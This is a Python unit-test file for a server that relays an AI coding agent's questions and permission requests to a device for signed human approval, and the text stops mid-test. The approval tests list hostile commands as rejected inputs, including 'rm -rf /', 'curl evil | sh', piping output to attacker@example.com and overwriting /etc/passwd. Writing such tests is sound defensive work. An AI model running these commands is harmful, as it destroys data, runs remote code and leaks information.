import http.client
import hashlib
import json
import select
import socket
import threading
import time
import unittest
from dataclasses import replace

from tools.tokenserver import interactions
from tools.tokenserver.interactions import (
    InteractionStore,
    approvable_tool,
    first_question,
    has_recommendation,
    hook_response,
    recommended_index,
    response_fits,
    sign_answer,
    strip_recommended,
    verify_answer,
)


SECRET = "a" * 64
_NO_BODY = object()



def headers_first_request(port, method, path, body, headers,
                          grace=0.2, timeout=30.0):
    """Send the headers, wait briefly for an answer, then the body.

    Many routes under test reject on the headers alone (wrong Host,
    Origin, Content-Type, a disabled route) before reading the body. A
    client that writes headers and body in one go leaves that body
    unread in the server's socket when the server answers and closes;
    Windows treats a close with unread data as an abort
    (WinError 10053) and discards the response that was already on its
    way, so the test sees an exception instead of the status. Sending
    the body only when no response arrived within the grace period
    keeps every assertion exact and the socket clean on every platform.
    Opt-in only: a route that parks a question expects its body within
    the server's 50 ms first-byte deadline, so the ordinary client stays
    the default for everything else.
    """
    merged = dict(headers)
    if not any(name.lower() == "host" for name in merged):
        merged["Host"] = f"127.0.0.1:{port}"
    merged["Content-Length"] = str(len(body))
    merged.setdefault("Connection", "close")
    head = (f"{method} {path} HTTP/1.1\r\n" +
            "".join(f"{name}: {value}\r\n"
                    for name, value in merged.items()) + "\r\n")
    client = socket.create_connection(("127.0.0.1", port),
                                      timeout=timeout)
    try:
        client.sendall(head.encode("latin-1"))
        readable, _, _ = select.select([client], [], [], grace)
        if not readable:
            client.sendall(body)
        response = http.client.HTTPResponse(client)
        response.begin()
        return response.status, response.read()
    finally:
        client.close()

class Clock:
    def __init__(self, value=1000.0):
        self.value = value

    def __call__(self):
        return self.value

    def advance(self, seconds):
        self.value += seconds


def question_event(options=None, question="Which auth approach?", **extra):
    options = options if options is not None else [
        {"label": "New auth layer (Recommended)",
         "description": "Cleaner architecture"},
        {"label": "Keep existing auth", "description": "Smaller change"},
    ]
    payload = {
        "session_id": "e8a3c2d1",
        "cwd": "/Users/niclas/vibepulse",
        "hook_event_name": "PreToolUse",
        "tool_name": "AskUserQuestion",
        "tool_input": {"questions": [
            {"question": question, "header": "Auth", "multiSelect": False,
             "options": options},
        ]},
    }
    payload["tool_input"]["questions"][0].update(extra)
    return payload


def approval_event(command="npm test", tool="Bash"):
    return {
        "session_id": "e8a3c2d1",
        "cwd": "/Users/niclas/vibepulse",
        "hook_event_name": "PermissionRequest",
        "tool_name": tool,
        "tool_input": {"command": command, "description": "Run the tests"},
    }


class RecommendationTests(unittest.TestCase):
    def test_suffix_wins_even_when_not_first(self):
        options = [{"label": "Redis"}, {"label": "In-process (Recommended)"}]
        self.assertEqual(recommended_index(options), 1)
        self.assertTrue(has_recommendation(options))

    def test_falls_back_to_first_when_unmarked(self):
        options = [{"label": "Redis"}, {"label": "In-process"}]
        self.assertEqual(recommended_index(options), 0)
        self.assertFalse(has_recommendation(options))

    def test_marker_is_chrome_not_part_of_the_answer(self):
        self.assertEqual(strip_recommended("New auth layer (Recommended)"),
                         "New auth layer")
        self.assertEqual(strip_recommended("  Redis  "), "Redis")

    def test_survives_junk_options(self):
        self.assertEqual(recommended_index([]), 0)
        self.assertEqual(recommended_index(None), 0)
        self.assertEqual(recommended_index(["not a dict"]), 0)
        self.assertFalse(has_recommendation(None))


class RenderabilityTests(unittest.TestCase):
    def test_single_question_is_renderable(self):
        self.assertIsNotNone(first_question(
            question_event()["tool_input"]))

    def test_multi_question_calls_are_not_answerable(self):
        payload = question_event()["tool_input"]
        payload["questions"].append(dict(payload["questions"][0]))
        self.assertIsNone(first_question(payload))

    def test_multiselect_is_not_answerable(self):
        payload = question_event(multiSelect=True)["tool_input"]
        self.assertIsNone(first_question(payload))

    def test_question_option_count_matches_firmware_uint8_boundary(self):
        accepted = question_event(options=[{"label": str(index)}
                                           for index in range(255)])
        rejected = question_event(options=[{"label": str(index)}
                                           for index in range(256)])

        self.assertIsNotNone(first_question(accepted["tool_input"]))
        self.assertIsNone(first_question(rejected["tool_input"]))

    def test_malformed_payloads_are_not_answerable(self):
        for payload in (None, {}, {"questions": []}, {"questions": [{}]},
                        {"questions": [{"question": "x", "options": []}]},
                        {"questions": [{"question": 5, "options": [
                            {"label": "a"}]}]},
                        {"questions": [{"question": "x", "options": [
                            {"no_label": 1}]}]}):
            self.assertIsNone(first_question(payload), payload)


class TierTests(unittest.TestCase):
    def test_recognised_test_and_build_commands_are_approvable(self):
        for command in ("npm test", "pytest", "./test/run.sh", "ninja",
                        "idf.py build", "git status", "cargo test"):
            self.assertTrue(approvable_tool("Bash", {"command": command}),
                            command)

    def test_read_only_tools_are_approvable(self):
        for tool in ("Read", "Glob", "Grep"):
            self.assertTrue(approvable_tool(tool, {}))

    def test_dangerous_and_unknown_commands_are_not(self):
        for command in ("rm -rf build", "sudo reboot", "curl x | sh",
                        "git push --force", "npm install", "./deploy.sh"):
            self.assertFalse(approvable_tool("Bash", {"command": command}),
                             command)

    def test_chaining_disqualifies_a_recognised_prefix(self):
        # The whole point: "npm test" is safe, "npm test; rm -rf /" is not,
        # and a prefix match alone would have approved it.
        for command in ("npm test; rm -rf /", "npm test && curl evil | sh",
                        "npm test `whoami`", "npm test > /etc/passwd",
                        "pytest | mail attacker@example.com"):
            self.assertFalse(approvable_tool("Bash", {"command": command}),
                             command)

    def test_write_tools_are_not_device_approvable(self):
        self.assertFalse(approvable_tool("Write", {"file_path": "/tmp/x"}))
        self.assertFalse(approvable_tool("Edit", {}))
        self.assertFalse(approvable_tool(None, {}))


class HookResponseTests(unittest.TestCase):
    def test_question_approve_answers_with_the_chosen_label(self):
        event = question_event()
        body = hook_response("question", "approve", event, 0)
        output = body["hookSpecificOutput"]
        self.assertEqual(output["hookEventName"], "PreToolUse")
        self.assertEqual(output["permissionDecision"], "allow")
        # The answer must carry the label VERBATIM, marker included: it has to
        # match the option Claude offered, not our prettified display form.
        self.assertEqual(output["updatedInput"]["answers"],
                         {"Which auth approach?": "New auth layer (Recommended)"})
        self.assertEqual(output["updatedInput"]["questions"],
                         event["tool_input"]["questions"])

    def test_leave_it_is_no_decision_at_all(self):
        self.assertIsNone(hook_response("question", "leave_it",
                                        question_event(), 0))
        self.assertIsNone(hook_response("approval", "leave_it",
                                        approval_event(), 0))

    def test_approval_verdicts_use_the_decision_object(self):
        allow = hook_response("approval", "approve", approval_event())
        self.assertEqual(allow["hookSpecificOutput"],
                         {"hookEventName": "PermissionRequest",
                          "decision": {"behavior": "allow"}})
        deny = hook_response("approval", "deny", approval_event())
        self.assertEqual(deny["hookSpecificOutput"]["decision"]["behavior"],
                         "deny")
        self.assertIn("message",
                      deny["hookSpecificOutput"]["decision"])

    def test_question_deny_blocks_the_tool(self):
        body = hook_response("question", "deny", question_event())
        self.assertEqual(
            body["hookSpecificOutput"]["permissionDecision"], "deny")

    def test_out_of_range_option_yields_no_decision(self):
        self.assertIsNone(hook_response("question", "approve",
                                        question_event(), 9))


class SignatureTests(unittest.TestCase):
    def test_round_trip(self):
        mac = sign_answer(SECRET, "abc", "approve", 1000)
        self.assertTrue(verify_answer(SECRET, "abc", "approve", 1000, mac,
                                      1000.0))

    def test_every_field_is_covered(self):
        mac = sign_answer(SECRET, "abc", "approve", 1000)
        self.assertFalse(verify_answer(SECRET, "abd", "approve", 1000, mac,
                                       1000.0))
        self.assertFalse(verify_answer(SECRET, "abc", "deny", 1000, mac,
                                       1000.0))
        self.assertFalse(verify_answer(SECRET, "abc", "approve", 1001, mac,
                                       1000.0))
        self.assertFalse(verify_answer("b" * 64, "abc", "approve", 1000, mac,
                                       1000.0))

    def test_stale_and_future_stamps_are_rejected(self):
        mac = sign_answer(SECRET, "abc", "approve", 1000)
        self.assertFalse(verify_answer(SECRET, "abc", "approve", 1000, mac,
                                       1000.0 + interactions.FRESHNESS_S + 1))
        self.assertFalse(verify_answer(SECRET, "abc", "approve", 1000, mac,
                                       1000.0 - interactions.FRESHNESS_S - 1))

    def test_junk_never_verifies(self):
        self.assertFalse(verify_answer(SECRET, "abc", "approve", "x", "y",
                                       1000.0))
        self.assertFalse(verify_answer(SECRET, "abc", "approve", 1000, None,
                                       1000.0))
        self.assertFalse(verify_answer("", "abc", "approve", 1000, "z",
                                       1000.0))

    def test_v2_round_trip_binds_provider_request_view_verdict_and_time(self):
        digest = "1" * 64
        mac = interactions.sign_answer_v2(
            SECRET, "claude", "request", digest, "approve", 1000)

        self.assertTrue(interactions.verify_answer_v2(
            SECRET, "claude", "request", digest, "approve", 1000, mac,
            1000.0))
        for provider, request_id, changed_digest, verdict, stamp in (
                ("codex", "request", digest, "approve", 1000),
                ("claude", "different", digest, "approve", 1000),
                ("claude", "request", "2" * 64, "approve", 1000),
                ("claude", "request", digest, "deny", 1000),
                ("claude", "request", digest, "approve", 1001)):
            with self.subTest(field=(provider, request_id, changed_digest,
                                     verdict, stamp)):
                self.assertFalse(interactions.verify_answer_v2(
                    SECRET, provider, request_id, changed_digest, verdict,
                    stamp, mac, 1000.0))

    def test_v2_validation_is_strict_and_fresh(self):
        digest = "1" * 64
        mac = interactions.sign_answer_v2(
            SECRET, "codex", "request", digest, "deny", 1000)

        invalid = (
            ("CODEX", digest, "deny", 1000, mac),
            ("codex", "A" * 64, "deny", 1000, mac),
            ("codex", "short", "deny", 1000, mac),
            ("codex", digest, "maybe", 1000, mac),
            ("codex", digest, "deny", 1000.5, mac),
            ("codex", digest, "deny", True, mac),
            ("codex", digest, "deny", 10 ** 1000, "0" * 64),
            ("codex", digest, "deny", 1000, "not-hex"),
        )
        for provider, changed_digest, verdict, stamp, changed_mac in invalid:
            with self.subTest(value=(provider, changed_digest, verdict,
                                     stamp, changed_mac)):
                self.assertFalse(interactions.verify_answer_v2(
                    SECRET, provider, "request", changed_digest, verdict,
                    stamp, changed_mac, 1000.0))
        self.assertFalse(interactions.verify_answer_v2(
            SECRET, "codex", "request", digest, "deny", 1000, mac,
            1000.0 + interactions.FRESHNESS_S + 1))


class ProviderStoreTests(unittest.TestCase):
    def setUp(self):
        self.clock = Clock()
        self.wall = Clock(50_000.0)
        self.audit = []
        self.store = InteractionStore(
            secret=SECRET, reveal_detail=True, now=self.clock,
            wall=self.wall,
            audit=lambda action, row: self.audit.append((action, row)))

    def answer(self, request_id, verdict="approve"):
        stamp = int(self.wall())
        entry = self.store._pending[request_id]
        mac = interactions.sign_answer_v2(
            SECRET, entry.provider.value, request_id, entry.view_sha256,
            verdict, stamp)
        return self.store.resolve(
            request_id, verdict, stamp, mac, provider=entry.provider.value,
            view_sha256=entry.view_sha256)

    def test_park_publish_resolve_round_trip(self):
        entry = self.store.park("question", question_event(), 120)
        public = self.store.pending_public()
        self.assertEqual(public["request_id"], entry.request_id)
        self.assertEqual(public["provider"], "claude")
        self.assertEqual(public["view_sha256"],
                         interactions.view_digest(public))
        self.assertEqual(public["title"], "New auth layer")
        self.assertEqual(public["subtitle"], "Cleaner architecture")
        self.assertEqual(public["project"], "vibepulse")
        self.assertTrue(public["can_approve"])
        self.assertTrue(public["marked"])
        self.assertEqual(public["options_total"], 2)
        self.assertEqual(public["hold_ms"], 120000)

        ok, _ = self.answer(entry.request_id)
        self.assertTrue(ok)
        body = self.store.await_verdict(entry)
        self.assertEqual(
            body["hookSpecificOutput"]["updatedInput"]["answers"],
            {"Which auth approach?": "New auth layer (Recommended)"})
        self.assertIsNone(self.store.pending_public())

    def test_internal_question_permission_never_replaces_real_question(self):
        question = self.store.park("question", question_event(), 120)
        self.assertIsNotNone(question)
        before = self.store.pending_public()

        duplicate = approval_event(tool="  ASKUSERQUESTION  ")
        duplicate["tool_input"] = question_event()["tool_input"]

        self.assertIsNone(self.store.park("approval", duplicate, 120))
        self.assertEqual(self.store.pending_public(), before)
        self.assertEqual(list(self.store._pending), [question.request_id])

    def test_claude_utf8_limits_are_bytes_and_preserve_codepoints(self):
        exact_cases = (
            (question_event(
                question="é" * 48,
                options=[{"label": "x (Recommended)"}]),
             "prompt", "é" * 48, 96),
            (question_event(options=[{
                "label": "é" * 32 + " (Recommended)",
                "description": "safe",
            }]), "title", "é" * 32, 64),
            (question_event(options=[{
                "label": "safe (Recommended)",
                "description": "é" * 32,
            }]), "subtitle", "é" * 32, 64),
        )
        for event, field, expected, limit in exact_cases:
            with self.subTest(field=field):
                entry = self.store.park("question", event, 120)
                self.assertIsNotNone(entry)
                public = self.store.pending_public()
                self.assertEqual(public[field], expected)
                self.assertLessEqual(
                    len(public[field].encode("utf-8")), limit)
                self.assertTrue(public["can_approve"])
                self.store.deny_all()

        too_wide = (
            question_event(question="é" * 49),
            question_event(options=[{
                "label": "é" * 33 + " (Recommended)",
                "description": "safe",
            }]),
            question_event(options=[{
                "label": "safe (Recommended)",
                "description": "é" * 33,
            }]),
        )
        for event in too_wide:
            with self.subTest(event=event):
                self.assertIsNone(self.store.park("question", event, 120))
                self.assertIsNone(self.store.pending_public())

    def test_claude_approval_and_normalized_views_use_utf8_byte_limits(self):
        exact_cases = (
            (approval_event(command="é" * 32), "title", "é" * 32, 64),
            (approval_event(tool="é" * 12), "tool", "é" * 12, 24),
        )
        exact_subtitle = approval_event()
        exact_subtitle["tool_input"]["description"] = "é" * 32
        exact_cases += ((exact_subtitle, "subtitle", "é" * 32, 64),)
        for event, field, expected, limit in exact_cases:
            with self.subTest(exact_field=field):
                entry = self.store.park("approval", event, 120)
                self.assertIsNotNone(entry)
                public = self.store.pending_public()
                self.assertEqual(public[field], expected)
                self.assertLessEqual(
                    len(public[field].encode("utf-8")), limit)
                self.store.deny_all()

        over_title = approval_event(command="é" * 33)
        over_tool = approval_event(tool="é" * 13)
        over_subtitle = approval_event()
        over_subtitle["tool_input"]["description"] = "é" * 33
        for event in (over_title, over_tool, over_subtitle):
            with self.subTest(event=event):
                self.assertIsNone(self.store.park("approval", event, 120))
                self.assertIsNone(self.store.pending_public())

        self.assertIsNotNone(interactions._normalized_view("question", {
            "kind": "question", "options_total": 1, "marked": True,
            "prompt": "safe", "title": "é" * 32, "can_approve": True,
        }))
        self.assertIsNone(interactions._normalized_view("question", {
            "kind": "question", "options_total": 1, "marked": True,
            "prompt": "safe", "title": "é" * 33, "can_approve": True,
        }))
        self.assertIsNotNone(interactions._normalized_view("approval", {
            "kind": "approval", "tool": "Read",
            "subtitle": "é" * 32, "can_approve": False,
        }))
        self.assertIsNone(interactions._normalized_view("approval", {
            "kind": "approval", "tool": "Read",
            "subtitle": "é" * 33, "can_approve": False,
        }))

    def test_truncated_question_prompt_is_alert_only(self):
        event = question_event(
            question="Choose carefully " + "x" * 200,
            options=[{"label": "Run tests (Recommended)"}])

        entry = self.store.park("question", event, 120)

        self.assertIsNotNone(entry)
        public = self.store.pending_public()
        self.assertTrue(public["prompt"].endswith("…"))
        self.assertLessEqual(
            len(public["prompt"].encode("utf-8")), interactions.PROMPT_MAX)
        self.assertFalse(public["can_approve"])

    def test_truncated_question_subtitle_is_alert_only(self):
        exact = question_event(options=[{
            "label": "Run tests (Recommended)",
            "description": "x" * 64,
        }])
        entry = self.store.park("question", exact, 120)
        self.assertIsNotNone(entry)
        public = self.store.pending_public()
        self.assertEqual(public["subtitle"], "x" * 64)
        self.assertTrue(public["can_approve"])
        self.store.deny_all()

        over = question_event(options=[{
            "label": "Run tests (Recommended)",
            "description": "x" * 65,
        }])
        entry = self.store.park("question", over, 120)
        self.assertIsNotNone(entry)
        public = self.store.pending_public()
        self.assertTrue(public["subtitle"].endswith("…"))
        self.assertLessEqual(
            len(public["subtitle"].encode("utf-8")),
            interactions.SUBTITLE_MAX)
        self.assertFalse(public["can_approve"])

    def test_truncated_approval_subtitle_is_alert_only(self):
        exact = approval_event(command="npm test")
        exact["tool_input"]["description"] = "é" * 32
        entry = self.store.park("approval", exact, 120)
        self.assertIsNotNone(entry)
        public = self.store.pending_public()
        self.assertEqual(public["subtitle"], "é" * 32)
        self.assertTrue(public["can_approve"])
        self.store.deny_all()

        over = approval_event(command="npm test")
        over["tool_input"]["description"] = "x" * 65
        entry = self.store.park("approval", over, 120)
        self.assertIsNotNone(entry)
        public = self.store.pending_public()
        self.assertTrue(public["subtitle"].endswith("…"))
        self.assertLessEqual(
            len(public["subtitle"].encode("utf-8")),
            interactions.SUBTITLE_MAX)
        self.assertFalse(public["can_approve"])

    def test_options_total_is_limited_to_firmware_uint8_range(self):
        base = {
            "kind": "question", "marked": False, "can_approve": False,
        }
        self.assertIsNotNone(interactions._normalized_view(
            "question", {**base, "options_total": 255}))
        self.assertIsNone(interactions._normalized_view(
            "question", {**base, "options_total": 256}))
        self.assertIsNone(self.store.park(
            "question", question_event(options=[{"label": str(index)}
                                                   for index in range(256)]),
            120))

    def test_view_digest_ignores_only_countdown_and_self_digest(self):
        self.store.park("question", question_event(), 90)
        public = self.store.pending_public()
        digest = public["view_sha256"]
        canonical = interactions.view_bytes(public)

        self.clock.advance(30)
        later = self.store.pending_public()
        self.assertNotEqual(later["expires_in_ms"], public["expires_in_ms"])
        self.assertEqual(later["view_sha256"], digest)
        self.assertEqual(interactions.view_digest(later), digest)
        self.assertEqual(interactions.view_bytes(later), canonical)
        changed = dict(later)
        changed["hold_ms"] += 1
        self.assertNotEqual(interactions.view_digest(changed), digest)

    def test_fractional_hold_uses_one_stored_value_in_view_and_digest(self):
        entry = self.store.park("approval", approval_event(), 90.001)
        public = self.store.pending_public()

        self.assertEqual(public["hold_ms"], 90001)
        self.assertEqual(public["view_sha256"], entry.view_sha256)
        self.assertEqual(interactions.view_digest(public), entry.view_sha256)

    def test_view_bytes_use_the_specified_canonical_json_encoding(self):
        view = {"provider": "claude", "title": "Fråga"}
        expected = b'{"provider":"claude","title":"Fr\xc3\xa5ga"}'

        self.assertEqual(interactions.view_bytes(view), expected)
        self.assertEqual(
            interactions.view_digest(view),
            "c7767b91a147d7b07a6b174b4b26544905c1419678e8c6a8f05dc3e83d06e2b2",
        )

    def test_new_ids_are_unique_canonical_128_bit_base64url(self):
        random_values = iter((bytes(range(16)), bytes(range(1, 17))))
        store = InteractionStore(
            secret=SECRET, reveal_detail=True, now=self.clock,
            wall=self.wall, random_bytes=lambda size: next(random_values))

        first = store.park("approval", approval_event(), 120)
        second = store.park("approval", approval_event(), 120)

        self.assertEqual(first.request_id, "AAECAwQFBgcICQoLDA0ODw")
        self.assertEqual(len(first.request_id), 22)
        self.assertRegex(first.request_id, r"^[A-Za-z0-9_-]{22}$")
        self.assertEqual(len(second.request_id), 22)
        self.assertNotEqual(first.request_id, second.request_id)

    def test_issued_id_history_is_bounded_without_evicting_active_ids(self):
        history_limit = interactions.ISSUED_ID_HISTORY_LIMIT
        next_value = 0
        forced_values = []

        def deterministic_bytes(size):
            nonlocal next_value
            self.assertEqual(size, 16)
            if forced_values:
                return forced_values.pop(0)
            raw = next_value.to_bytes(16, "big")
            next_value += 1
            return raw

        store = InteractionStore(
            secret=SECRET, reveal_detail=True, now=self.clock,
            wall=self.wall, random_bytes=deterministic_bytes)
        live = store.park("approval", approval_event(), 120)
        seen = {live.request_id}
        terminal = store.park("approval", approval_event(), 120)
        seen.add(terminal.request_id)
        stamp = int(self.wall())
        terminal_mac = interactions.sign_answer_v2(
            SECRET, "claude", terminal.request_id, terminal.view_sha256,
            "deny", stamp)
        self.assertEqual(store.resolve(
            terminal.request_id, "deny", stamp, terminal_mac,
            provider="claude", view_sha256=terminal.view_sha256),
            (True, "ok"))

        for _ in range(history_limit * 3):
            entry = store.park("approval", approval_event(), 120)
            self.assertIsNotNone(entry)
            self.assertNotIn(entry.request_id, seen)
            seen.add(entry.request_id)
            stamp = int(self.wall())
            mac = interactions.sign_answer_v2(
                SECRET, "claude", entry.request_id, entry.view_sha256,
                "deny", stamp)
            self.assertEqual(
                store.resolve(
                    entry.request_id, "deny", stamp, mac,
                    provider="claude", view_sha256=entry.view_sha256),
                (True, "ok"))
            self.assertIsNotNone(store.await_verdict(entry))

        self.assertLessEqual(len(store._issued_ids), history_limit)
        self.assertIn(live.request_id, store._issued_ids)
        self.assertIn(terminal.request_id, store._issued_ids)
        self.assertIsNotNone(store.await_verdict(terminal))
        forced_values.extend((bytes(16), next_value.to_bytes(16, "big")))
        collision = store.park("approval", approval_event(), 120)
        self.assertIsNotNone(collision)
        self.assertNotEqual(collision.request_id, live.request_id)
        store.deny_all()

    def test_v1_claude_compatibility_returns_the_exact_hook_shape(self):
        event = approval_event()
        entry = self.store.park_legacy("approval", event, 120)

        public = self.store.pending_public()
        self.assertNotIn("provider", public)
        self.assertNotIn("view_sha256", public)

        stamp = int(self.wall())
        mac = sign_answer(SECRET, entry.request_id, "approve", stamp)
        ok, reason = self.store.resolve(
            entry.request_id, "approve", stamp, mac)

        self.assertEqual((ok, reason), (True, "ok"))
        self.assertEqual(self.store.await_verdict(entry),
                         hook_response("approval", "approve", event))

    def test_new_claude_entry_cannot_be_resolved_by_stripping_v2_binding(self):
        entry = self.store.park("approval", approval_event(), 120)
        shown = self.store.pending_public()
        self.assertEqual(shown["provider"], "claude")
        self.assertEqual(shown["view_sha256"], entry.view_sha256)

        stamp = int(self.wall())
        stripped_mac = sign_answer(
            SECRET, entry.request_id, "approve", stamp)
        ok, reason = self.store.resolve(
            entry.request_id, "approve", stamp, stripped_mac)

        self.assertEqual((ok, reason), (False, "v2 verdict required"))
        self.assertEqual(self.store.pending_public()["request_id"],
                         entry.request_id)

    def test_hold_ms_is_the_original_duration_for_the_ring(self):
        # The countdown ring needs the original hold, not just the remaining
        # time. hold_ms is fixed at park; expires_in_ms drains beside it.
        entry = self.store.park("question", question_event(), 90)
        public = self.store.pending_public()
        self.assertEqual(public["hold_ms"], 90000)
        self.clock.advance(30)
        later = self.store.pending_public()
        self.assertEqual(later["hold_ms"], 90000)
        self.assertLess(later["expires_in_ms"], public["expires_in_ms"])
        self.answer(entry.request_id)
        self.store.await_verdict(entry)

    def test_hold_duration_rejects_invalid_and_uint32_overflow_values(self):
        maximum_ms = interactions.MAX_HOLD_MS
        invalid = (
            None, False, True, 0, -1, float("nan"), float("inf"),
            1e308, (maximum_ms + 1) / 1000,
        )
        for hold_s in invalid:
            with self.subTest(hold_s=hold_s):
                store = InteractionStore(
                    secret=SECRET, reveal_detail=True, now=self.clock,
                    wall=self.wall)
                try:
                    entry = store.park(
                        "approval", approval_event(), hold_s)
                except (OverflowError, ValueError) as exc:
                    self.fail(f"park leaked a hold conversion error: {exc}")
                self.assertIsNone(entry)
                self.assertIsNone(store.pending_public())

        at_boundary = InteractionStore(
            secret=SECRET, reveal_detail=True, now=self.clock,
            wall=self.wall)
        entry = at_boundary.park(
            "approval", approval_event(), maximum_ms / 1000)
        self.assertIsNotNone(entry)
        self.assertEqual(entry.hold_ms, maximum_ms)

        subsecond = InteractionStore(
            secret=SECRET, reveal_detail=True, now=self.clock,
            wall=self.wall)
        entry = subsecond.park("approval", approval_event(), 0.5)
        self.assertIsNotNone(entry)
        self.assertEqual(entry.hold_ms, 1000)

    def test_a_second_tap_cannot_land_on_a_later_prompt(self):
        first = self.store.park("question", question_event(), 120)
        ok, _ = self.answer(first.request_id)
        self.assertTrue(ok)
        self.store.await_verdict(first)
        second = self.store.park("approval", approval_event(), 120)
        # The device re-sends the first tap (flaky WiFi). It must not resolve
        # the approval now on screen.
        stamp = int(self.wall())
        mac = interactions.sign_answer_v2(
            SECRET, "claude", first.request_id, first.view_sha256,
            "approve", stamp)
        ok, reason = self.store.resolve(
            first.request_id, "approve", stamp, mac, provider="claude",
            view_sha256=first.view_sha256)
        self.assertFalse(ok)
        self.assertIn("no such pending", reason)
        self.assertIsNotNone(self.store.pending_public())
        self.assertEqual(self.store.pending_public()["request_id"],
                         second.request_id)

    def test_timeout_yields_no_decision(self):
        entry = self.store.park("question", question_event(), 30)
        self.clock.advance(31)
        self.assertIsNone(self.store.pending_public())  # sweeps it
        self.assertIsNone(self.store.await_verdict(entry))
        self.assertIn("timeout", [action for action, _ in self.audit])

    def test_unsigned_and_missigned_answers_are_refused(self):
        entry = self.store.park("approval", approval_event(), 120)
        stamp = int(self.wall())
        ok, reason = self.store.resolve(entry.request_id, "approve", stamp,
                                        "0" * 64, provider="claude",
                                        view_sha256=entry.view_sha256)
        self.assertFalse(ok)
        self.assertEqual(reason, "signature rejected")
        ok, _ = self.store.resolve(
            entry.request_id, "approve", stamp, None, provider="claude",
            view_sha256=entry.view_sha256)
        self.assertFalse(ok)
        # ...and the interaction is still pending, not consumed by the attempt
        self.assertIsNotNone(self.store.pending_public())

    def test_replay_outside_the_freshness_window_is_refused(self):
        entry = self.store.park("approval", approval_event(), 600)
        stamp = int(self.wall())
        mac = interactions.sign_answer_v2(
            SECRET, "claude", entry.request_id, entry.view_sha256,
            "approve", stamp)
        self.wall.advance(interactions.FRESHNESS_S + 5)
        ok, reason = self.store.resolve(
            entry.request_id, "approve", stamp, mac, provider="claude",
            view_sha256=entry.view_sha256)
        self.assertFalse(ok)
        self.assertEqual(reason, "signature rejected")

    def test_approve_is_refused_when_the_panel_could_not_offer_it(self):
        entry = self.store.park("approval", approval_event("rm -rf build"),
                                120)
        self.assertFalse(self.store.pending_public()["can_approve"])
        ok, reason = self.answer(entry.request_id, "approve")
        self.assertFalse(ok)
        self.assertIn("terminal", reason)
        # deny always works, even for what may not be approved
        ok, _ = self.answer(entry.request_id, "deny")
        self.assertTrue(ok)
        body = self.store.await_verdict(entry)
        self.assertEqual(
            body["hookSpecificOutput"]["decision"]["behavior"], "deny")

    def test_unmarked_questions_are_alert_only(self):
        # Claude did not mark a recommendation, so there is nothing the panel
        # may claim and commit on one tap. First-option is a convention, not
        # a recommendation — the design doc's "never invent a recommendation".
        entry = self.store.park("question", question_event(options=[
            {"label": "Redis", "description": "Shared"},
            {"label": "In-process", "description": "No infra"},
        ]), 120)
        public = self.store.pending_public()
        self.assertFalse(public["marked"])
        self.assertFalse(public["can_approve"])
        # the alert still carries enough to walk over on
        self.assertEqual(public["title"], "Redis")
        ok, reason = self.answer(entry.request_id, "approve")
        self.assertFalse(ok)
        self.assertIn("terminal", reason)
        # deny and leave_it still work
        ok, _ = self.answer(entry.request_id, "leave_it")
        self.assertTrue(ok)
        self.assertIsNone(self.store.await_verdict(entry))

    def test_marked_questions_stay_approvable_wherever_the_mark_sits(self):
        entry = self.store.park("question", question_event(options=[
            {"label": "Redis", "description": "Shared"},
            {"label": "In-process (Recommended)", "description": "No infra"},
        ]), 120)
        public = self.store.pending_public()
        self.assertTrue(public["marked"])
        self.assertTrue(public["can_approve"])
        self.assertEqual(public["title"], "In-process")
        ok, _ = self.answer(entry.request_id, "approve")
        self.assertTrue(ok)
        body = self.store.await_verdict(entry)
        self.assertEqual(
            body["hookSpecificOutput"]["updatedInput"]["answers"],
            {"Which auth approach?": "In-process (Recommended)"})

    def test_unreadable_command_cannot_be_approved(self):
        long_command = "npm test -- " + "x" * 200
        self.store.park("approval", approval_event(long_command), 120)
        public = self.store.pending_public()
        self.assertFalse(public["can_approve"])
        self.assertTrue(public["title"].endswith("…"))

    def test_unrenderable_payloads_are_never_parked(self):
        payload = question_event()
        payload["tool_input"]["questions"].append({"question": "second"})
        self.assertIsNone(self.store.park("question", payload, 120))
        self.assertIsNone(self.store.park("question", {}, 120))
        self.assertIsNone(self.store.park("nonsense", question_event(), 120))
        self.assertIsNone(self.store.pending_public())

    def test_legacy_park_rejects_lone_surrogates_without_raising(self):
        invalid_project = approval_event()
        invalid_project["cwd"] = "/tmp/bad\ud800"
        events = (
            question_event(question="bad\ud800"),
            approval_event("bad\udc00"),
            invalid_project,
        )
        for event in events:
            with self.subTest(event=event["hook_event_name"]):
                try:
                    entry = self.store.park(
                        "question" if event["hook_event_name"] == "PreToolUse"
                        else "approval",
                        event, 120)
                except UnicodeEncodeError as exc:
                    self.fail(f"park leaked UnicodeEncodeError: {exc}")
                self.assertIsNone(entry)
        self.assertIsNone(self.store.pending_public())

    def test_legacy_park_rejects_control_and_bidi_display_text(self):
        for forbidden in ("\x00", "\u202e"):
            question_label = question_event(options=[
                {"label": f"Run tests{forbidden} (Recommended)",
                 "description": "Safe local tests"},
                {"label": "Leave unchanged"},
            ])
            question_prompt = question_event(
                question=f"Approve{forbidden}this?")
            approval_title = approval_event(f"npm test {forbidden}")
            approval_subtitle = approval_event()
            approval_subtitle["tool_input"]["description"] = \
                f"Safe{forbidden}tests"
            approval_tool = approval_event(tool=f"Read{forbidden}")
            events = (
                ("option label", "question", question_label),
                ("prompt", "question", question_prompt),
                ("title", "approval", approval_title),
                ("subtitle", "approval", approval_subtitle),
                ("tool", "approval", approval_tool),
            )
            for field, kind, event in events:
                with self.subTest(
                        forbidden=ascii(forbidden), field=field):
                    self.assertIsNone(self.store.park(kind, event, 120))
                    self.assertIsNone(self.store.pending_public())

    def test_legacy_park_rejects_controls_in_project_without_sanitizing(self):
        for forbidden in ("\x00", "\u202e"):
            with self.subTest(forbidden=ascii(forbidden)):
                event = approval_event()
                event["cwd"] = f"/tmp/safe{forbidden}name"
                self.assertIsNone(self.store.park("approval", event, 120))
                self.assertIsNone(self.store.pending_public())

    def test_valid_international_display_text_still_parks(self):
        event = question_event(
            question="Vilken väg?",
            options=[
                {"label": "Kör tester (Recommended)",
                 "description": "Säker ändring"},
                {"label": "Lämna oförändrat"},
            ])

        entry = self.store.park("question", event, 120)

        self.assertIsNotNone(entry)
        public = self.store.pending_public()
        self.assertEqual(public["prompt"], "Vilken väg?")
        self.assertEqual(public["title"], "Kör tester")
        self.assertEqual(public["subtitle"], "Säker ändring")

    def test_queue_is_bounded(self):
        parked = [self.store.park("approval", approval_event(), 300)
                  for _ in range(interactions.MAX_PENDING)]
        self.assertTrue(all(parked))
        self.assertIsNone(self.store.park("approval", approval_event(), 300))

    def test_oldest_interaction_is_the_one_on_screen(self):
        first = self.store.park("approval", approval_event(), 300)
        self.clock.advance(1)
